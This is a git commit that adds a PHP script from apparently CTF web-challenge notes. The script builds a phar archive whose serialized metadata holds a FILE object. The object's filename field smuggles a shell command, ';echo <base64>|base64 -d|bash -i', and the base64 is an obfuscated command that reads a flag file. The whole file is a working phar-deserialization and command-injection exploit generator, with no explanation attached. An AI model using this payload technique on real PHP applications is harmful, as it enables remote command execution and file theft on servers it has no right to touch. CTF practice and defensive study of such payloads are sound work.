6ccc03b8f56859074246c662dfba314d1996aec5
wgf4242 <wgf4242@gmail.com>
2023-07-25 07:41:58 +0800

    sync

---
+++ docs/ctf/scripts/web/php_phar1.php
@@ -0,0 +1,24 @@
+<?php
+class FILE{
+    public $filename=";echo Y2F0IC9hZGphc2tkaG5hc2tfZmxhZ19pc19oZXJlX2Rha2pkbm1zYWtqbmZrc2Q=|base64 -d|bash -i>4.txt";
+    public $lasttime;
+    public $size;
+    public function remove(){
+        unlink($this->filename);
+    }
+    public function show()
+    {
+        echo "Filename: ". $this->filename. "  Last Modified Time: ".$this->lasttime. "  Filesize: ".$this->size."<br>";
+    }
+}
+
+#获取phar包
+$phar = new Phar("abc.phar");
+$phar->startBuffering();
+$phar->setStub("<?php __HALT_COMPILER(); ?>");
+
+$o = new FILE();
+$phar->setMetadata($o);
+$phar->addFromString("test.txt", "test");
+$phar->stopBuffering();
+?>
